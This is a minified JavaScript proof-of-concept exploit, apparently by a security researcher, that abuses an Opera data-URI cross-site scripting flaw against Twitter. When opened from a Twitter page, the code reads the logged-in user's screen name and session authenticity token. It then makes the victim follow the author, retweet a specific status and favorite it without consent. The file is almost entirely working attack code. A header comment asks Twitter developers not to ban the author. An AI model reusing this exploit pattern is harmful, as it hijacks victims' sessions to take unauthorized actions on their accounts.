//@source http://code.eligrey.com/sec/opera/data-uri-xss/twitter-poc.js
/* Twitter devs:
	Please don't ban me! Just delete my tweet or set window.disable_opera_29480_exploit
	to true to disable this exploit. If you must reset my follower count, the 76 people
	who were following me prior to this exploit are in ./followers-backup.txt
*/
(function(h,b){"use strict";var i=document,k=i.getElementById("message"),j=function(l){return i.createTextNode(l)},d=function(l){return i.createElement(l)},c=function(l,m){return l.appendChild(m)};if(!h.opera){c(c(k,d("p")),j("Sorry, but this exploit only works in Opera."))}else{if(!b){c(c(k,d("p")),j("This exploit only works when you visit it from Twitter."))}else{if(!b.disable_opera_29480_exploit){var f=b.$('meta[name="session-user-screen_name"]').attr("content"),g=d("a");g.href="http://twitter.com/sephr/status/16227251336";c(g,j("my tweet"));if(f){var a=c(k,d("p"));c(a,j("Hey, "));var e=c(a,d("a"));c(e,j(f));c(a,e).href="http://twitter.com/"+f;c(a,j("! The following is a log of the actions performed by the exploit."));b.twttr.api.follow("14272306",{success:function(){var m=c(k,d("p"));c(m,j("You are now following "));var l=c(m,d("a"));c(l,j("me"));c(m,l).href="http://twitter.com/sephr";c(m,j("."))}});b.$.ajax({type:"POST",url:"/statuses/16227251336/retweet",data:{authenticity_token:b.twttr.form_authenticity_token,controller_name:b.page.controller_name,action_name:b.page.action_name},dataType:"json",success:function(){var l=c(k,d("p"));c(l,j("You have just retweeted "));c(l,g.cloneNode(true));c(l,j("."))}});b.$.ajax({type:"POST",dataType:"json",url:"/favorites/create/16227251336",data:{authenticity_token:b.twttr.form_authenticity_token},success:function(){var l=c(k,d("p"));c(l,j("You have just favorited "));c(l,g.cloneNode(true));c(l,j("."))}})}else{c(c(k,d("p")),j("Please log in to twitter and then visit this link again for the exploit to work."))}}}}}(self,opener));
